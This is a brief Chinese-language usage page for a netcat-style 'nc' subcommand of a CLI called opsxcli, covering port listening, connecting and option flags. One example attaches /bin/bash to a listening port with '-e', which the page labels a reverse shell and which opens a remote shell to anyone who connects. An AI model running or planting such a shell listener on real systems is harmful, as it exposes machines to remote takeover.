# NC 工具

网络连接工具，支持端口监听和连接。

## 监听端口

```bash
# 监听端口
opsxcli nc -l -p 10800

# 监听并执行命令（反弹shell）
opsxcli nc -l -p 10800 -e /bin/bash -v
```

## 连接

```bash
# 连接目标终端
opsxcli nc 10.10.10.156 10800
opsxcli nc 10.10.10.156 10800 -v
```

## 参数

- `-l, --listen`: 监听模式
- `-p, --port`: 端口号
- `-v, --verbose`: 详细输出
- `-e, --execute`: 执行命令（监听模式）
